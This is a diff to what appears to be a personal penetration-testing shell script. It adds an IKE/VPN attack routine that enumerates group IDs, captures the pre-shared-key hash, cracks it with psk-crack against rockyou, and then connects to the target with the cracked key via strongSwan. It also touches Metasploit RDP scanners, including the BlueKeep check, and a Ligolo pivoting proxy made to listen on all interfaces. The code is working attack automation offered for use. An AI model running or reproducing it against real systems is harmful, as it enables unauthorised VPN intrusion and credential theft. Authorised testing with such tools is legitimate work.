@@ -122,7 +122,7 @@ nscan(){
     local server="$1"
     sudo nmap $flag -n -Pn --disable-arp-ping -v -p$2 "$server" --script="$script_arg"
     
-    if [[ $1 == "rdp" ]]; then
+    if [[ $service == "rdp" ]]; then
         echo -e "\nMSF ENUMERATION\n"
         msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner; set RPORT $2; set RHOSTS $1; exploit; exit"
         msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RPORT $2; set RHOSTS $1; exploit; exit"
@@ -137,6 +137,39 @@ nscan(){
             xfreerdp /u:$usr /p:"$psw" /v:$1
         fi
     fi
+
+    if [[ $service == "ike" ]];then
+        echo -e "\n[+] NMAP ENUMERATION\n"
+        sudo nmap -n -Pn -sV -p$2 --script="ike-version" $1
+
+        echo -e "\n[+] SCANNING VIA IKE-SCAN, ATTEMPTING TO RETRIEVE ID HANDSHAKE\n"
+        sudo ike-scan -M -A --showbackoff $1 -d $2
+        sudo ike-scan -M -A --showbackoff --ikev2 $1 -d $2
+
+        echo -e "\n[+] SCANNING VIA IKER, SEARCHING VALID ID VALUES\n"
+        sudo python3 /home/damuna/TOOLS/iker.py --fullalgs --clientids /usr/share/seclists/Miscellaneous/ike-groupid.txt -o IKE_AUDIT_$1.txt $1
+
+        read -r ike_id\?"[+] INPUT A VALID IKE-ID VALUE (BLANK TO SKIP): "
+        if [[ ! -z $ike_id ]]; then
+            echo -e "\n[+] GRABBING AND CRACKING HASH\n"
+            sudo ike-scan -M -A -n $ike_id --pskcrack=$1_ike_hash.txt $2 -d $2
+            psk-crack -d /usr/share/wordlists/rockyou.txt $1_ike_hash.txt
+
+            read -r ike_psw\?"[+] INPUT FOUND PSK PASSWORD: "
+            if [[ ! -z $ike_psw ]]; then
+                echo -e "\n[+] INITIATING STRONG-SWAN CONNECTION\n"
+                chnic
+
+                echo "$1 : PSK \"$ike_psw\"" | sudo tee -a /etc/ipsec.secrets
+                echo "conn host_$1\n\tauthby=secret\n\tauto=add\n\tkeyexchange=ikev1\n\tike=3des-sha1-modp1024!\n\tleft=$1\n\tright=$1\n\ttype=transport\n\tesp=3des-sha1!\n\trightprotoport=tcp" | sudo tee -a /etc/ipsec.conf
+
+                sudo ipsec stop
+                sudo ipsec start
+                sudo ipsec up host_$1
+            fi
+        fi
+    fi
+
     if [[ $service == "rexec" ]];then
         vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
         if [[ -z $wd_user ]]; then
@@ -1261,10 +1294,9 @@ dnsrec(){
     done
 }
 
-# Ligolo proxy
 ligstart(){
-    mkdir ./LIGOLO_DATA && cd ./LIGOLO_DATA
-    sudo ligolo-proxy -selfcert
+    mkdir -p ./LIGOLO_DATA && cd ./LIGOLO_DATA
+    sudo ligolo-proxy -selfcert -laddr "0.0.0.0:${1:-11601}"
 }
 
 # Default credentials for services / applications
